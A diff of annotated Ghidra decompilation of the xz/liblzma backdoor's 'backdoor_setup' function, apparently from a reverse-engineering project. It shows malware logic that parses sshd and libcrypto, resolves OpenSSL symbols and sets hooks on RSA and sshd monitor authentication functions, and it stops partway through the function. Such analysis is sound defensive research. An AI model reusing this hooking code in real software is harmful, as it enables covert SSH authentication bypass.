@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
 // Function: backdoor_setup @ 0x105830
-// Calling convention: unknown
-// Prototype: undefined backdoor_setup(void)
+// Calling convention: __stdcall
+// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)
 
 
 /*
@@ -18,451 +18,475 @@
 #include "xzre_types.h"
 
 
-undefined1  [16] backdoor_setup(long param_1)
+BOOL backdoor_setup(backdoor_setup_params_t *params)
 
 {
-  undefined4 *puVar1;
-  undefined8 *puVar2;
-  undefined8 uVar3;
-  int *piVar4;
-  undefined4 uVar5;
-  uint uVar6;
-  undefined4 uVar7;
-  BOOL bVar8;
-  byte bVar9;
-  byte bVar10;
-  int iVar11;
-  int iVar12;
-  long lVar13;
-  long *plVar14;
-  long lVar15;
-  long lVar16;
-  long lVar17;
-  long lVar18;
-  long lVar19;
-  undefined8 uVar20;
-  long lVar21;
-  ulong uVar22;
-  ulong uVar23;
-  long lVar24;
-  ulong uVar25;
-  undefined4 *puVar26;
-  ulong uVar27;
-  ulong uVar28;
-  undefined1 *puVar29;
-  undefined4 *puVar30;
-  undefined4 *puVar31;
-  ulong uVar32;
-  byte bVar33;
-  long lVar34;
-  ulong uVar35;
-  byte bVar36;
-  int iVar37;
-  code *pcVar38;
-  undefined1 *puVar39;
-  ulong uVar40;
-  ulong local_b20;
-  undefined4 *local_b10;
-  undefined4 local_acc;
-  long local_ac8;
-  undefined8 local_ac0;
-  undefined8 local_ab8;
-  undefined8 local_ab0;
-  undefined8 local_aa8;
-  long local_aa0;
-  ulong local_a98;
-  long local_a90;
-  undefined1 **local_a88;
-  ulong local_a80;
-  undefined8 *local_a78;
-  undefined8 local_a70;
-  long *local_a68;
-  undefined1 **local_a60;
-  undefined8 *local_a58;
-  undefined8 *local_a50;
-  undefined8 *local_a48;
-  undefined8 local_a40;
-  undefined1 *local_a38;
-  long local_a30;
-  long local_a28;
-  undefined2 local_a20;
-  byte local_a15;
-  undefined4 local_a14;
-  byte local_a10;
-  uint local_a08;
-  long local_a00;
-  long local_9f0;
-  long local_9d8;
-  undefined4 local_9d0;
-  undefined4 uStack_9cc;
-  undefined2 local_9c8;
-  char local_9bd;
-  undefined4 local_9bc;
-  byte local_9b8;
-  ulong local_9a8;
-  long local_998;
-  long local_980 [3];
-  long local_968;
-  undefined1 *local_950;
-  undefined1 *local_948;
-  undefined1 *local_940;
-  undefined1 *local_938;
-  long *local_930;
-  long *local_928;
-  undefined1 **local_920;
-  undefined1 local_918 [256];
-  undefined1 local_818 [256];
-  undefined1 local_718 [256];
-  undefined1 local_618 [256];
-  long local_518 [32];
-  undefined1 local_418 [112];
-  undefined1 local_3a8 [8];
-  long alStack_3a0 [72];
-  long local_160;
-  undefined8 local_158;
-  long local_80;
-  ulong local_60;
-  ulong local_58;
-  undefined1 local_48 [24];
-  long local_30;
+  global_context_t *ctx;
+  imported_funcs_t *imported_funcs;
+  u32 *puVar1;
+  audit_ifaces *paVar2;
+  elf_handles_t *peVar3;
+  uint uVar4;
+  u32 uVar5;
+  u64 *puVar6;
+  u64 *puVar7;
+  backdoor_hooks_ctx_t *pbVar8;
+  backdoor_hooks_data_t **ppbVar9;
+  u64 uVar10;
+  pfn_RSA_get0_key_t ppVar11;
+  pfn_EVP_PKEY_set1_RSA_t ppVar12;
+  sshd_monitor_func_t psVar13;
+  _func_67 *p_Var14;
+  Elf64_Addr EVar15;
+  Elf64_Ehdr *pEVar16;
+  sshd_ctx_t *psVar17;
+  byte *pbVar18;
+  undefined4 *puVar19;
+  undefined4 uVar20;
+  undefined4 uVar21;
+  undefined4 uVar22;
+  BOOL bVar23;
+  elf_info_t *elf_info;
+  byte bVar24;
+  EncodedStringId EVar25;
+  BOOL BVar26;
+  void *pvVar27;
+  lzma_allocator *plVar28;
+  _func_17 *p_Var29;
+  lzma_allocator *plVar30;
+  elf_info_t *peVar31;
+  _func_41 *p_Var32;
+  void *pvVar33;
+  elf_functions_t *peVar34;
+  _func_60 *p_Var35;
+  Elf64_Sym *pEVar36;
+  char *pcVar37;
+  _func_58 *p_Var38;
+  Elf64_Sym *pEVar39;
+  Elf64_Sym *pEVar40;
+  _func_55 *p_Var41;
+  Elf64_Sym *pEVar42;
+  Elf64_Rela *mem_address;
+  int *piVar43;
+  u8 *puVar44;
+  long lVar45;
+  u8 *puVar46;
+  Elf64_Ehdr *string_begin;
+  u8 *puVar47;
+  backdoor_data_t *pbVar48;
+  elf_entry_ctx_t *peVar49;
+  global_context_t *pgVar50;
+  backdoor_hooks_data_t *pbVar51;
+  sshd_ctx_t *psVar52;
+  sshd_log_ctx_t *psVar53;
+  imported_funcs_t *piVar54;
+  u8 *puVar55;
+  dasm_ctx_t *pdVar56;
+  audit_ifaces *paVar57;
+  undefined1 uVar58;
+  undefined1 uVar59;
+  u8 *puVar60;
+  sshd_monitor_func_t *code_start;
+  int iVar61;
+  byte bVar62;
+  string_references_t string_refs;
+  backdoor_shared_libraries_data_t shared_maps;
+  backdoor_data_t backdoor_data;
+  backdoor_hooks_data_t *hooks;
+  global_context_t *global_ctx;
+  u8 *local_b48;
+  u8 *local_b20;
+  backdoor_hooks_data_t *local_b10;
+  EncodedStringId local_acc;
+  ptrdiff_t local_ac8;
+  pfn_RSA_public_decrypt_t *local_ac0;
+  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
+  pfn_RSA_get0_key_t *local_ab0;
+  void *local_aa8;
+  u64 local_aa0;
+  u64 local_a98;
+  u64 local_a90;
+  main_elf_t local_a88;
+  u64 *local_a70;
+  backdoor_shared_libraries_data_t local_a68;
+  dasm_ctx_t local_a30;
+  dasm_ctx_t local_9d8;
+  backdoor_data_t local_980;
   
-  bVar36 = 0;
+  bVar62 = 0;
   local_acc = 0;
-  plVar14 = local_980;
-  for (lVar24 = 0x256; lVar24 != 0; lVar24 = lVar24 + -1) {
-    *(undefined4 *)plVar14 = 0;
-    plVar14 = (long *)((long)plVar14 + 4);
+  pbVar48 = &local_980;
+  for (lVar45 = 0x256; lVar45 != 0; lVar45 = lVar45 + -1) {
+    *(undefined4 *)&pbVar48->main_map = 0;
+    pbVar48 = (backdoor_data_t *)((long)&pbVar48->main_map + 4);
   }
-  puVar29 = local_918;
-  local_948 = local_818;
-  local_940 = local_718;
+  peVar3 = &local_980.elf_handles;
+  local_980.elf_handles.dynamic_linker = &local_980.dynamic_linker_info;
+  local_980.elf_handles.libc = &local_980.libc_info;
   local_ac8 = 0;
-  local_ac0 = 0;
-  local_ab8 = 0;
-  local_ab0 = 0;
-  local_aa8 = 0;
-  lVar24 = *(long *)(param_1 + 0x80);
-  local_938 = local_618;
-  local_930 = local_518;
-  local_950 = puVar29;
-  local_928 = local_980;
-  local_920 = &local_950;
-  update_got_address();
-  if (*(long *)(lVar24 + 8) != 0) {
-    uVar27 = *(ulong *)(*(long *)(lVar24 + 8) + 0x18 + *(long *)(lVar24 + 0x18) * 8);
-    uVar32 = *(ulong *)(lVar24 + 0x28);
-    lVar24 = uVar32 - uVar27;
-    if (uVar32 <= uVar27) {
-      lVar24 = uVar27 - uVar32;
+  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
+  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
+  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
+  local_aa8 = (void *)0x0;
+  peVar49 = params->entry_ctx;
+  local_980.elf_handles.liblzma = &local_980.liblzma_info;
+  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
+  local_980.elf_handles.main = &local_980.main_info;
+  local_980.data_handle.data = &local_980;
+  local_980.data_handle.elf_handles = peVar3;
+  update_got_address(peVar49);
+  pvVar27 = (peVar49->got_ctx).got_ptr;
+  if (pvVar27 != (void *)0x0) {
+    puVar6 = *(u64 **)((long)pvVar27 + (long)(peVar49->got_ctx).cpuid_fn * 8 + 0x18);
+    puVar7 = peVar49->frame_address;
+    lVar45 = (long)puVar7 - (long)puVar6;
+    if (puVar7 <= puVar6) {
+      lVar45 = (long)puVar6 - (long)puVar7;
     }
-    if (lVar24 < 0x50001) {
-      uVar27 = uVar27 & 0xfffffffffffff000;
-      uVar32 = uVar27 - 0x20000;
+    if (lVar45 < 0x50001) {
+      string_begin = (Elf64_Ehdr *)((ulong)puVar6 & 0xfffffffffffff000);
+      pEVar16 = string_begin + -0x800;
 LAB_00105951:
-      iVar11 = get_string_id(uVar27,0);
-      if (iVar11 != 0x300) goto code_r0x00105962;
-      local_a78 = &local_aa8;
-      local_a70 = *(undefined8 *)(*(long *)(param_1 + 0x80) + 0x28);
-      local_a88 = &local_950;
-      local_a80 = uVar27;
-      iVar11 = main_elf_parse(&local_a88);
-      if (iVar11 != 0) {
-        local_30 = get_lzma_allocator(1);
-        lVar24 = 0;
+      EVar25 = get_string_id((char *)string_begin,(char *)0x0);
+      if (EVar25 != STR_ELF) goto code_r0x00105962;
+      local_a88.__libc_stack_end = &local_aa8;
+      local_a70 = params->entry_ctx->frame_address;
+      local_a88.elf_handles = peVar3;
+      local_a88.dynamic_linker_ehdr = string_begin;
+      BVar26 = main_elf_parse(&local_a88);
+      if (BVar26 != FALSE) {
+        local_980.import_resolver = get_lzma_allocator();
+        lVar45 = 0;
         do {
-          local_48[lVar24] = *(undefined1 *)(local_30 + lVar24);
-          lVar24 = lVar24 + 1;
-        } while (lVar24 != 0x18);
-        local_a58 = &local_ac0;
-        local_a50 = &local_ab8;
-        local_a48 = &local_ab0;
-        local_a40 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x38);
-        local_a68 = local_980;
-        local_a60 = &local_950;
-        local_a38 = local_418;
-        iVar11 = process_shared_libraries(&local_a68);
-        if (iVar11 == 0) goto LAB_00105a59;
-        local_b10 = (undefined4 *)**(undefined8 **)(*(long *)(param_1 + 0x10) + 0x38);
-        puVar26 = local_b10 + 0x4e;
-        puVar31 = local_b10 + 0x146;
-        puVar1 = local_b10 + 0xa8;
-        puVar30 = puVar26;
-        for (lVar24 = 0x5a; lVar24 != 0; lVar24 = lVar24 + -1) {
-          *puVar30 = 0;
-          puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
+          *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar45) =
+               *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar45);
+          lVar45 = lVar45 + 1;
+        } while (lVar45 != 0x18);
+        local_a68.RSA_public_decrypt_plt = &local_ac0;
+        local_a68.EVP_PKEY_set1_RSA_plt = &local_ab8;
+        local_a68.RSA_get0_key_plt = &local_ab0;
+        local_a68.hooks_data_addr = params->hook_params->hooks_data_addr;
+        local_a68.data = &local_980;
+        local_a68.elf_handles = peVar3;
+        local_a68.libc_imports = &local_980.libc_imports;
+        BVar26 = process_shared_libraries(&local_a68);
+        if (BVar26 == FALSE) goto LAB_00105a59;
+        local_b10 = *params->hook_params->hooks_data_addr;
+        ctx = &local_b10->global_ctx;
+        imported_funcs = &local_b10->imported_funcs;
+        pgVar50 = ctx;
+        for (lVar45 = 0x5a; lVar45 != 0; lVar45 = lVar45 + -1) {
+          pgVar50->uses_endbr64 = FALSE;
+          pgVar50 = (global_context_t *)((long)pgVar50 + (ulong)bVar62 * -8 + 4);
         }
-        *(undefined4 **)(local_b10 + 0x5a) = puVar31;
-        lVar24 = *(long *)(param_1 + 0x10);
-        *(undefined4 **)(local_b10 + 0x50) = puVar1;
-        *(undefined4 **)(local_b10 + 0x56) = local_b10 + 0xf2;
-        plVar14 = *(long **)(lVar24 + 0x38);
-        *(undefined4 **)(local_b10 + 0x52) = local_b10 + 0x12a;
-        lVar24 = *plVar14;
-        uVar20 = *(undefined8 *)(lVar24 + 0x580);
-        *(undefined8 *)(local_b10 + 0x88) = 0;
-        *(long *)(local_b10 + 0x8a) = lVar24 + 0x588;
-        *(undefined8 *)(local_b10 + 0x86) = uVar20;
-        elf_find_string_references(puVar29,local_3a8);
+        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
+        pbVar8 = params->hook_params;
+        (local_b10->global_ctx).imported_funcs = imported_funcs;
+        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
+        ppbVar9 = pbVar8->hooks_data_addr;
+        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
+        pbVar51 = *ppbVar9;
+        uVar10 = pbVar51->signed_data_size;
+        (local_b10->global_ctx).current_data_size = 0;
+        (local_b10->global_ctx).payload_data = &pbVar51->signed_data;
+        (local_b10->global_ctx).payload_data_size = uVar10;
+        elf_find_string_references(&local_980.main_info,&local_980.string_refs);
         local_aa0 = 0;
-        lVar24 = elf_get_code_segment(local_938,&local_aa0);
-        if (lVar24 != 0) {
-          *(long *)(local_b10 + 0x6e) = lVar24;
-          *(long *)(local_b10 + 0x70) = lVar24 + local_aa0;
-          puVar30 = local_b10;
-          for (lVar24 = 0x4e; lVar24 != 0; lVar24 = lVar24 + -1) {
-            *puVar30 = 0;
-            puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
+        pvVar27 = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
+        if (pvVar27 != (void *)0x0) {
+          (local_b10->global_ctx).lzma_code_start = pvVar27;
+          (local_b10->global_ctx).lzma_code_end = (void *)((long)pvVar27 + local_aa0);
+          pbVar51 = local_b10;
+          for (lVar45 = 0x4e; lVar45 != 0; lVar45 = lVar45 + -1) {
+            (pbVar51->ldso_ctx)._unknown1459[0] = '\0';
+            (pbVar51->ldso_ctx)._unknown1459[1] = '\0';
+            (pbVar51->ldso_ctx)._unknown1459[2] = '\0';
+            (pbVar51->ldso_ctx)._unknown1459[3] = '\0';
+            pbVar51 = (backdoor_hooks_data_t *)((long)pbVar51 + (ulong)bVar62 * -8 + 4);
           }
-          lVar24 = *(long *)(param_1 + 0x10);
-          *(undefined4 **)(local_b10 + 0x4a) = puVar1;
-          uVar20 = *(undefined8 *)(lVar24 + 0x50);
-          *(undefined8 *)(local_b10 + 0x44) = *(undefined8 *)(lVar24 + 0x48);
-          uVar3 = *(undefined8 *)(*(long *)(param_1 + 8) + 8);
-          *(undefined8 *)(local_b10 + 0x48) = uVar20;
-          *(undefined8 *)(local_b10 + 0x46) = uVar3;
-          puVar30 = local_b10 + 0xf2;
-          for (lVar24 = 0x38; lVar24 != 0; lVar24 = lVar24 + -1) {
-            *puVar30 = 0;
-            puVar30 = puVar30 + (ulong)bVar36 * -2 + 1;
+          pbVar8 = params->hook_params;
+          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
+          ppVar11 = pbVar8->hook_RSA_get0_key;
+          (local_b10->ldso_ctx).hook_RSA_public_decrypt = pbVar8->hook_RSA_public_decrypt;
+          ppVar12 = params->shared->hook_EVP_PKEY_set1_RSA;
+          (local_b10->ldso_ctx).hook_RSA_get0_key = ppVar11;
+          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = ppVar12;
+          psVar52 = &local_b10->sshd_ctx;
+          for (lVar45 = 0x38; lVar45 != 0; lVar45 = lVar45 + -1) {
+            psVar52->have_mm_answer_keyallowed = FALSE;
+            psVar52 = (sshd_ctx_t *)((long)psVar52 + (ulong)bVar62 * -8 + 4);
           }
-          *(undefined8 *)(local_b10 + 0xf6) = **(undefined8 **)(param_1 + 8);
-          uVar20 = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x78);
-          *(undefined8 *)(local_b10 + 0xf8) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x70);
-          *(undefined8 *)(local_b10 + 0xfa) = uVar20;
-          for (lVar24 = 0x1a; lVar24 != 0; lVar24 = lVar24 + -1) {
-            *puVar31 = 0;
-            puVar31 = puVar31 + (ulong)bVar36 * -2 + 1;
+          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
+               params->shared->mm_answer_authpassword_hook;
+          psVar13 = params->hook_params->mm_answer_keyverify;
+          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_params->mm_answer_keyallowed;
+          (local_b10->sshd_ctx).mm_answer_keyverify = psVar13;
+          psVar53 = &local_b10->sshd_log_ctx;
+          for (lVar45 = 0x1a; lVar45 != 0; lVar45 = lVar45 + -1) {
+            psVar53->logging_disabled = FALSE;
+            psVar53 = (sshd_log_ctx_t *)((long)psVar53 + (ulong)bVar62 * -8 + 4);
           }
-          *(undefined8 *)(local_b10 + 0x15e) = *(undefined8 *)(*(long *)(param_1 + 0x10) + 0x58);
-          **(undefined8 **)(*(long *)(param_1 + 8) + 0x10) = puVar26;
-          puVar31 = puVar1;
-          for (lVar24 = 0x4a; lVar24 != 0; lVar24 = lVar24 + -1) {
-            *puVar31 = 0;
-            puVar31 = puVar31 + (ulong)bVar36 * -2 + 1;
+          (local_b10->sshd_log_ctx).mm_log_handler = (_func_63 *)params->hook_params->mm_log_handler
+          ;
+          *params->shared->globals = ctx;
+          piVar54 = imported_funcs;
+          for (lVar45 = 0x4a; lVar45 != 0; lVar45 = lVar45 + -1) {
+            *(undefined4 *)&piVar54->RSA_public_decrypt = 0;
+            piVar54 = (imported_funcs_t *)((long)piVar54 + (ulong)bVar62 * -8 + 4);
           }
-          *(undefined8 *)(local_b10 + 0xae) = local_ac0;
-          *(undefined8 *)(local_b10 + 0xb0) = local_ab8;
-          *(undefined8 *)(local_b10 + 0xb2) = local_ab0;
-          lVar24 = 0;
+          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
+          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
+          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
+          lVar45 = 0;
           do {
-            *(undefined1 *)((long)local_b10 + lVar24 + 0x4a8) = local_418[lVar24];
-            lVar24 = lVar24 + 1;
-          } while (lVar24 != 0x70);
-          *(undefined4 **)(local_b10 + 0xee) = local_b10 + 0x12a;
-          *(undefined8 *)(local_b10 + 0x144) = local_aa8;
-          lVar24 = get_lzma_allocator(1);
-          *(undefined1 **)(lVar24 + 0x10) = local_940;
-          lVar13 = lzma_alloc(0x440,lVar24);
-          *(long *)(local_b10 + 300) = lVar13;
-          if (lVar13 != 0) {
-            local_b10[0x12a] = local_b10[0x12a] + 1;
+            (local_b10->libc_imports)._unknown993[lVar45 + -4] =
+                 local_980.libc_imports._unknown993[lVar45 + -4];
+            lVar45 = lVar45 + 1;
+          } while (lVar45 != 0x70);
+          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
+          (local_b10->libc_imports).__libc_stack_end = local_aa8;
+          plVar28 = get_lzma_allocator();
+          plVar28->opaque = local_980.elf_handles.libc;
+          p_Var29 = (_func_17 *)lzma_alloc(0x440,plVar28);
+          (local_b10->libc_imports).malloc_usable_size = p_Var29;
+          if (p_Var29 != (_func_17 *)0x0) {
+            (local_b10->libc_imports).resolved_imports_count =
+                 (local_b10->libc_imports).resolved_imports_count + 1;
           }
-          iVar11 = find_dl_audit_offsets(&local_928,&local_ac8,local_b10,puVar1);
-          if (iVar11 == 0) goto LAB_00105a60;
-          lVar13 = get_lzma_allocator(1);
-          *(long **)(lVar13 + 0x10) = local_930;
-          plVar14 = local_930;
-          if (local_930 != (long *)0x0) {
-            plVar14 = (long *)elf_symbol_get(local_930,0x798,0);
-            lVar15 = lzma_alloc(0xaf8,lVar13);
-            *(long *)(local_b10 + 0xc6) = lVar15;
-            if (lVar15 != 0) {
-              local_b10[0xf0] = local_b10[0xf0] + 1;
+          BVar26 = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
+          ;
+          if (BVar26 == FALSE) goto LAB_00105a60;
+          plVar30 = get_lzma_allocator();
+          plVar30->opaque = local_980.elf_handles.libcrypto;
+          peVar31 = local_980.elf_handles.libcrypto;
+          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
+            peVar31 = (elf_info_t *)
+                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
+            p_Var32 = (_func_41 *)lzma_alloc(0xaf8,plVar30);
+            (local_b10->imported_funcs).EVP_MD_CTX_new = p_Var32;
+            if (p_Var32 != (_func_41 *)0x0) {
+              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+              *puVar1 = *puVar1 + 1;
             }
           }
-          local_a30 = 0;
-          local_9d8 = 0;
-          puVar29 = local_950;
-          lVar15 = elf_get_code_segment(local_950,&local_a30);
-          lVar34 = local_a30 + lVar15;
-          lVar16 = elf_get_data_segment(puVar29,&local_9d8,0);
-          *(long *)(local_b10 + 100) = lVar15;
-          *(long *)(local_b10 + 0x66) = lVar34;
-          *(long *)(local_b10 + 0x68) = lVar16;
-          *(long *)(local_b10 + 0x6a) = local_9d8 + lVar16;
-          lVar15 = get_elf_functions_address(3);
-          if (((lVar15 == 0) || (pcVar38 = *(code **)(lVar15 + 0x20), pcVar38 == (code *)0x0)) ||
-             (*(long *)(lVar15 + 0x30) == 0)) goto LAB_00105a60;
-          lVar34 = 0;
-          lVar16 = (*pcVar38)(local_930,0x418);
-          *(long *)(local_b10 + 0xec) = lVar16;
-          if (lVar16 != 0) {
-            lVar34 = elf_symbol_get(local_930,0xc40,0);
+          elf_info = local_980.elf_handles.main;
+          local_a30.instruction = (u8 *)0x0;
+          local_9d8.instruction = (u8 *)0x0;
+          pvVar27 = elf_get_code_segment(local_980.elf_handles.main,(u64 *)&local_a30);
+          puVar60 = local_a30.instruction + (long)pvVar27;
+          pvVar33 = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
+          (local_b10->global_ctx).sshd_code_start = pvVar27;
+          (local_b10->global_ctx).sshd_code_end = puVar60;
+          (local_b10->global_ctx).sshd_data_start = pvVar33;
+          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)pvVar33;
+          peVar34 = get_elf_functions_address();
+          if (((peVar34 == (elf_functions_t *)0x0) ||
+              (p_Var14 = peVar34->elf_symbol_get_addr, p_Var14 == (_func_67 *)0x0)) ||
+             (peVar34->elf_parse == (_func_68 *)0x0)) goto LAB_00105a60;
+          pEVar36 = (Elf64_Sym *)0x0;
+          p_Var35 = (_func_60 *)(*p_Var14)(local_980.elf_handles.libcrypto,STR_BN_free);
+          (local_b10->imported_funcs).BN_free = p_Var35;
+          if (p_Var35 != (_func_60 *)0x0) {
+            pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
           }
-          local_acc = 0x2c8;
-          lVar16 = elf_find_string(local_950,&local_acc,0);
-          *(long *)(local_b10 + 0x5c) = lVar16;
-          if (lVar16 == 0) goto LAB_00105a60;
-          local_acc = 0x710;
-          lVar16 = elf_find_string(local_950,&local_acc,0);
-          *(long *)(local_b10 + 0x5e) = lVar16;
-          if (lVar16 == 0) goto LAB_00105a60;
-          lVar17 = 0;
-          lVar16 = elf_symbol_get_addr(local_930,0x6d0);
-          *(long *)(local_b10 + 0xe8) = lVar16;
-          if (lVar16 != 0) {
-            lVar16 = elf_symbol_get(local_930,0x958,0);
-            if (lVar16 != 0) {
-              lVar16 = *(long *)(lVar16 + 8);
-              lVar17 = *local_930;
-              local_b10[0xf0] = local_b10[0xf0] + 1;
-              *(long *)(local_b10 + 0xde) = lVar16 + lVar17;
+          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
+          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
+          (local_b10->global_ctx).STR_ssh_rsa_cert_v01_openssh_com = pcVar37;
+          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
+          local_acc = STR_rsa_sha2_256;
+          pcVar37 = elf_find_string(local_980.elf_handles.main,&local_acc,(void *)0x0);
+          (local_b10->global_ctx).STR_rsa_sha2_256 = pcVar37;
+          if (pcVar37 == (char *)0x0) goto LAB_00105a60;
+          pEVar39 = (Elf64_Sym *)0x0;
+          p_Var38 = (_func_58 *)elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
+          (local_b10->imported_funcs).BN_bn2bin = p_Var38;
+          if (p_Var38 != (_func_58 *)0x0) {
+            pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
+            if (pEVar39 != (Elf64_Sym *)0x0) {
+              EVar15 = pEVar39->st_value;
+              pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+              *puVar1 = *puVar1 + 1;
+              (local_b10->imported_funcs).BN_dup = (_func_53 *)(pEVar16->e_ident + EVar15);
             }
-            lVar17 = elf_symbol_get(local_930,0x918,0);
-            if (*(long *)(local_b10 + 0xec) != 0) {
-              local_b10[0xf0] = local_b10[0xf0] + 1;
-            }
-          }
-          lVar16 = elf_symbol_get(local_930,0xac0,0);
-          lVar18 = (*pcVar38)(local_930,0x540);
-          lVar19 = 0;
-          *(long *)(local_b10 + 0xe2) = lVar18;
-          if (lVar18 != 0) {
-            local_b10[0xf0] = local_b10[0xf0] + 1;
-            lVar19 = elf_symbol_get(local_930,0x8f8,0);
-            if (plVar14 != (long *)0x0) {
-              lVar18 = plVar14[1];
-              lVar21 = *local_930;
-              local_b10[0xf0] = local_b10[0xf0] + 1;
-              *(long *)(local_b10 + 0xc0) = lVar18 + lVar21;
+            pEVar39 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
+            if ((local_b10->imported_funcs).BN_free != (_func_60 *)0x0) {
+              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+              *puVar1 = *puVar1 + 1;
             }
           }
-          if (*(long *)(local_b10 + 0xe8) != 0) {
-            local_b10[0xf0] = local_b10[0xf0] + 1;
+          pEVar40 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
+          p_Var41 = (_func_55 *)(*p_Var14)(local_980.elf_handles.libcrypto,STR_RSA_set0_key);
+          pEVar42 = (Elf64_Sym *)0x0;
+          (local_b10->imported_funcs).RSA_set0_key = p_Var41;
+          if (p_Var41 != (_func_55 *)0x0) {
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
+            pEVar42 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
+            if (peVar31 != (elf_info_t *)0x0) {
+              EVar15 = peVar31->first_vaddr;
+              pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+              puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+              *puVar1 = *puVar1 + 1;
+              (local_b10->imported_funcs).RSA_get0_key =
+                   (pfn_RSA_get0_key_t)(pEVar16->e_ident + EVar15);
+            }
           }
-          iVar11 = sshd_find_sensitive_data(local_950,local_930,local_3a8,puVar1);
-          if (iVar11 == 0) goto LAB_00105a60;
-          if (lVar34 != 0) {
-            lVar34 = *(long *)(lVar34 + 8);
-            lVar18 = *local_930;
-            local_b10[0xf0] = local_b10[0xf0] + 1;
-            *(long *)(local_b10 + 0xe0) = lVar34 + lVar18;
+          if ((local_b10->imported_funcs).BN_bn2bin != (_func_58 *)0x0) {
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
           }
-          if (lVar17 != 0) {
-            lVar34 = *(long *)(lVar17 + 8);
-            lVar17 = *local_930;
-            local_b10[0xf0] = local_b10[0xf0] + 1;
-            *(long *)(local_b10 + 0xdc) = lVar34 + lVar17;
+          BVar26 = sshd_find_sensitive_data
+                             (local_980.elf_handles.main,local_980.elf_handles.libcrypto,
+                              &local_980.string_refs,imported_funcs,ctx);
+          if (BVar26 == FALSE) goto LAB_00105a60;
+          if (pEVar36 != (Elf64_Sym *)0x0) {
+            EVar15 = pEVar36->st_value;
+            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
+            (local_b10->imported_funcs).BN_bin2bn = (_func_54 *)(pEVar16->e_ident + EVar15);
           }
-          if (lVar16 != 0) {
-            lVar16 = *(long *)(lVar16 + 8);
-            lVar34 = *local_930;
-            local_b10[0xf0] = local_b10[0xf0] + 1;
-            *(long *)(local_b10 + 0xea) = lVar16 + lVar34;
+          if (pEVar39 != (Elf64_Sym *)0x0) {
+            EVar15 = pEVar39->st_value;
+            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
+            (local_b10->imported_funcs).RSA_new = (_func_52 *)(pEVar16->e_ident + EVar15);
           }
-          if (lVar19 != 0) {
-            lVar16 = *(long *)(lVar19 + 8);
-            lVar34 = *local_930;
-            local_b10[0xf0] = local_b10[0xf0] + 1;
-            *(long *)(local_b10 + 0xe6) = lVar16 + lVar34;
+          if (pEVar40 != (Elf64_Sym *)0x0) {
+            EVar15 = pEVar40->st_value;
+            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
+            (local_b10->imported_funcs).RSA_free = (_func_59 *)(pEVar16->e_ident + EVar15);
           }
-          lVar34 = elf_symbol_get(local_930,0x3f0,0);
-          uVar20 = 0;
-          puVar2 = *(undefined8 **)(local_b10 + 0x56);
-          local_a30 = 0;
+          if (pEVar42 != (Elf64_Sym *)0x0) {
+            EVar15 = pEVar42->st_value;
+            pEVar16 = (local_980.elf_handles.libcrypto)->elfbase;
+            puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
+            *puVar1 = *puVar1 + 1;
+            (local_b10->imported_funcs).RSA_sign = (_func_57 *)(pEVar16->e_ident + EVar15);
+          }
+          pEVar36 = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
+          peVar31 = local_980.elf_handles.main;
